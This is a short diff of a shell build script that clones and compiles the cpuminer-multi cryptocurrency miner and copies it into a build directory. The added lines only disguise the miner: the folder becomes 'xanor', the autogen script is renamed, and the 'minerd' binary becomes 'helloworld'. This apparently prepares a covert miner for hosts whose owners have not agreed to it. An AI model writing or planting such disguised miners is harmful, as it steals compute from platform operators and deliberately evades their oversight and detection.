@@ -64,11 +64,14 @@ echo "kasdopasdokdpas"
 echo "kasdopasdokdpas"
 
 git clone https://github.com/hyc/cpuminer-multi
-cd cpuminer-multi
+mv cpuminer-multi xanor
+cd xanor
 chmod 777 autogen.sh
-./autogen.sh
+mv autogen.sh auto.sh
+./auto.sh
 CFLAGS="-march=native" ./configure
 make
+mv minerd helloworld
 cd ..
 mv * $BUILD_DIR/
 echo "done"
